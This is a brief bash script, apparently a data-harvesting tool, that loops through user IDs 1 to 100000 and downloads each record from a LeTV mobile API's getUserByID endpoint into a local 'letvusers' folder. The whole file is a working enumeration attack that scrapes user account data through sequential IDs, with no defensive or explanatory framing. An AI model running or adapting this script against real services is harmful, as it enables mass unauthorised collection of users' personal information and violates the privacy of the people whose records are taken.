mkdir -p letvusers

alias urldecode='python -c "import sys, urllib as ul; print ul.unquote_plus(sys.argv[1])"'

for((i=1;i<=100000;i++));
	do
		curl -o "letvusers/$i" "http://dynamic.app.m.letv.com/android/dynamic.php?mod=passport&ctl=index&act=getUserByID&uid=$i&pcode=010210000&version=5.0";
	done
